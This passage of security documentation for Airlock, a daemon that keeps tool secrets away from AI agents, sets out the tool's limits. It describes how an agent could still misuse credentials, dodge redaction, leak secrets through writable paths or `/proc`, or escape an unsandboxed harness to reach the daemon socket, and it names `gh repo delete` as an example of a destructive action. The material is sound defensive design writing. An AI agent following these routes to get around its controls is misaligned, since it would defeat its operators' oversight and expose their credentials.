- **NDJSON line cap**: Every line read from a client (initial control frame and per-message stdin frames) is capped at 1 MiB by `tokio-util`'s `LinesCodec`. Without this, a client that opens the socket and never sends a newline would force the daemon to grow its read buffer without bound.
- **Overflow handling**: An oversized initial frame is answered with a generic `malformed request` / `request exceeds maximum length` error; an oversized stdin line during an active exec triggers SIGTERM → SIGKILL on the child's process group and returns `exit { code: -1 }` to the client.
- **Error messages are generic**: The daemon never echoes raw parser errors or line contents back to the client — parse failures log the underlying error to the ring buffer and return `"malformed request"` so no fragment of the offending input is reflected.

## Graceful shutdown

On SIGTERM:

1. The daemon stops accepting new connections.
2. SIGTERM is sent to all registered child PIDs.
3. After a 5-second grace period, remaining children receive SIGKILL.
4. PID file and socket are cleaned up.

## What Airlock does NOT protect against

### Destructive actions via tools

**This is by design.** Airlock prevents secret *leakage*, not secret *misuse*. If you supply a GitHub token with repo-delete permissions, the agent can invoke `gh repo delete` and the tool will succeed. Airlock ensures the agent can't *extract* the token and exfiltrate it — but the tools themselves run with the full authority of the credentials they receive.

**Mitigation:** Always use the narrowest possible token scope. GitHub fine-grained PATs, least-privilege IAM roles, read-only API keys. This is the single most impactful security measure you can take.

### Secrets transformed in novel ways

Redaction covers raw UTF-8, base64, URL-encoded, and hexadecimal forms. It does not cover arbitrary transformations — a tool that reverses the string, encrypts it, or splits it across multiple lines with interleaving will bypass the automaton.

**Mitigation:** Redaction is defense-in-depth. The primary defense is that the agent harness never receives tool secrets in the first place. This threat is largely eliminated by [never declaring shells or interpreters as tools](#never-declare-shells-interpreters-or-network-tools-as-tools) — purpose-built CLIs like `gh` or `tofu` don't offer the agent a way to transform secrets in their output.

### Side-channel leaks via writable paths

A tool could write its secrets to a file in a writable sandbox path. If the agent can read that path on a subsequent invocation (or through another tool), the secret is exposed. This is especially dangerous if the tool is a shell or interpreter where the agent controls the script — see [tool selection guidance](#tool-selection-what-should-and-should-not-be-an-airlock-tool).

**Mitigation:** Keep writable paths narrow. Don't grant tools write access to directories the agent harness can read directly. Don't declare scriptable tools.

### Network exfiltration by tools

An ordinary tool has unrestricted outbound network access. A compromised or malicious tool binary could send its secrets to an external endpoint.

**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. A [proxy tool](#proxy-tools) is the one case where egress *is* restricted — to a single loopback port, with the destination host decided by the route table — and it is also the one case where the tool holds no secret to exfiltrate.

### Memory inspection

Secrets exist in the daemon's address space. An attacker with root access, `ptrace` capabilities, or core dump access can read them.

**Mitigation:** Airlock applies best-effort hardening at daemon startup — `RLIMIT_CORE = 0` on both platforms, and on Linux `prctl(PR_SET_DUMPABLE, 0)` (which also blocks same-UID ptrace under `kernel.yama.ptrace_scope`). Secret values held in the daemon are wrapped in a `Secret<T>` newtype that zeroes their backing memory on drop. These are defense-in-depth; a local root user or a distro configured with a permissive `ptrace_scope` can still inspect the process. Run the daemon with appropriate OS-level protections — this remains a general concern for any process holding secrets.

### Secrets visible via `/proc/<child_pid>/environ`

Secrets are passed to sandboxed tools as environment variables. On Linux, another process running as the same UID can read the child's environment via `/proc/<child_pid>/environ` for the lifetime of the child. This is the same threat class as same-UID ptrace of the daemon itself.

Airlock assumes same-UID processes are not adversarial — the enclosing agent sandbox is expected to address that.

**Planned mitigation:** set `PR_SET_DUMPABLE = 0` in the child's `pre_exec` so `/proc/<pid>/{environ,mem,maps}` revert to root ownership and same-UID ptrace is blocked under yama. Tracked in [TODO.md](TODO.md).

### Agent harness escape

If the agent harness is not sandboxed, the agent could read the daemon's PID file, connect to the socket directly, and request tool execution — or attempt to read secrets from `/proc/<daemon_pid>/mem`. Airlock's daemon-client split only provides isolation if the agent actually runs in a restricted environment.

**Mitigation:** Always sandbox the agent harness. Use `airlock run` (built-in OS-level sandbox), Claude Code's `--sandbox` mode, Docker, nsjail, bubblewrap, or similar. See the README's ["Where Airlock fits"](README.md#where-airlock-fits) section.
